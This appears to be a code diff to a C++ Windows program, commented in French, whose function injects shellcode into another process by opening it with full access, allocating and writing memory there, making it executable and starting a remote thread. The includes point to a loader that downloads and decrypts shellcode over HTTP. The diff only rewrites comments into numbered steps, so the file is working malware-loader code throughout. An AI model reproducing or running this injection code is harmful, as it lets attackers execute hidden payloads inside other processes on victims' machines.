@@ -3,13 +3,13 @@
 #include <Windows.h>
 #include <tchar.h>
 
-#include "Memory.h"  // Supposons que vous avez un fichier d'en-tête pour l'injection de shellcode
-#include "HTTPClient.h"    // Supposons que vous avez un fichier pour récupérer le shellcode via HTTP
-#include "Decrypt.h"  // Si vous avez besoin de déchiffrer le shellcode
+#include "Memory.h"  
+#include "HTTPClient.h"
+#include "Decrypt.h"
 
 // Fonction pour injecter le shellcode dans le processus local
 bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
-    // Ouvrir le processus distant avec les droits nécessaires
+    // Étape 1 : Ouvrir le processus cible
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
     if (hProcess == NULL) {
         std::cerr << "Erreur : Impossible d'ouvrir le processus cible !" << std::endl;
@@ -17,7 +17,7 @@ bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
     }
     std::cout << "Processus cible ouvert avec succès." << std::endl;
 
-    // Allouer de la mémoire dans l'espace mémoire du processus distant
+    // Étape 2 : Allouer de la mémoire dans le processus distant
     LPVOID remoteAddr = VirtualAllocEx(
         hProcess,
         NULL,
@@ -32,7 +32,7 @@ bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
     }
     std::cout << "Mémoire allouée à distance à l'adresse : " << remoteAddr << std::endl;
 
-    // Écrire le shellcode dans la mémoire allouée du processus distant
+    // Étape 3 : Écrire le shellcode dans la mémoire allouée
     SIZE_T bytesWritten;
     BOOL success = WriteProcessMemory(
         hProcess,
@@ -52,7 +52,7 @@ bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
 
     }
 
-    // Modifier les permissions de la mémoire pour permettre l'exécution
+    // Étape 4 : Modifier les permissions mémoire pour l'exécution
     DWORD oldProtect;
     if (!VirtualProtectEx(hProcess, remoteAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
         std::cerr << "Erreur : Échec de VirtualProtectEx pour rendre la mémoire exécutable !" << std::endl;
@@ -63,9 +63,7 @@ bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
     std::cout << "Permissions changées en PAGE_EXECUTE_READ." << std::endl;
 
 
-    // Créer un thread pour exécuter le shellcode
-
-    // Créer un thread dans le processus distant pour exécuter le shellcode
+    // Étape 5 : Créer un thread pour exécuter le shellcode
     HANDLE hThread = CreateRemoteThread(
         hProcess,
         NULL,
@@ -83,13 +81,11 @@ bool injectShellcode(LPVOID shellcode, SIZE_T shellcodeSize, DWORD targetPid) {
     }
     std::cout << "Thread créé avec succès dans le processus distant." << std::endl;
 
-    // Attendre la fin du thread
+    
     WaitForSingleObject(hThread, INFINITE);
     std::cout << "Le shellcode a été exécuté dans le processus distant." << std::endl;
 
-    // Nettoyer les ressources
     CloseHandle(hThread);
-    //VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
     CloseHandle(hProcess);
     return true;
 }
